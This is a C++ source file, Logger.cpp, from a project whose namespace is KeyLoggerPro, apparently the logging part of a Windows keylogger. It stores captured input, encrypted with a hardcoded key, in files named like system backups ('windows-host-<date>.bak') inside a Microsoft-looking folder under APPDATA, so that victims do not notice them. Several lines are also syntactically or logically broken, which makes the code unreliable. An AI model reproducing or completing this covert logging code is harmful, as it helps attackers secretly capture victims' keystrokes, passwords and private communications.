/**
 * Logger.cpp
 *
 * @author Raul Butuc
 * @version 1.0.2 - 03/08/2016
 */

#include "stdafx.h"
#include "Logger.h"
#include "Encryption.h"
#include "BasicDateTime.h"

namespace KeyLoggerPro {

  LPCWSTR Logger::strToLPCWSTR(const std::string &_str) {
    wchar_t* wString = new wchar_t[2 * strlen(_str.c_str())];
    MultiByteToWideChar(CP_ACP, 0, _str.c_str(), -1, wString, 2 * strlen(_str.c_str()));

    return wString;
  }

  std::string Logger::getLogDir(const bool _app_sep = false) const {
    std::string appdata(getenv("APPDATA"));
    std::string dir = appdata + "\\Microsoft\\CLR";

    return dir + (_app_sep ? "\\" : "");
  }

  bool Logger::chkdir(const std::string &_path) {
    return static_cast<bool>(CreateDirectory(strToLPCWSTR(_path), nullptr) ||
        GetLastError() == ERROR_ALREADY_EXISTS);
  }

  bool Logger::mkdir(std::string _path) {
    for (char &ch : _path) {
      if (ch == '\\') {
        ch = '\0';

        if (!chkdir(_path)) {
          return false;
        }

        ch = '\\';
      }
    }

    return true;
  }

  template <class _Tp>
  std::string Logger::write(const _Tp* &_inf) {
    BasicDateTime bDateTime;
    std::string path = getLogDir(true);
    path.append("windows-host-").append(bDateTime.shortDateToString()).append(".bak");

    try {
      log(path, std::ios::app);

      if (!log)
        return "";

      std::string data = "[" + bDateTime.dateToString() + "]\n" + _inf + "\n";
      std::string key = "MNmtceICrTlqSCxJhWgAcPpPKGPQVxtlWsSsElDCdQegutNVwUDFpft";
      std::string _enc_data(data.size(), '\0');
      int re = data.size() % 8;
      key.append('-', re);

      Encryption _safe_enc((unsigned char*)key, key.size());
      _safe_enc.encrypt((unsigned char*)data.c_str(), (unsigned char*)_enc_data, data.size(), Encryption::CBC);
      log << _enc_data;

      return path(path.begin()+path.find_last_of('\\'), path.end());
    }
    catch (...) {
      return nullptr;
    }
  }

}
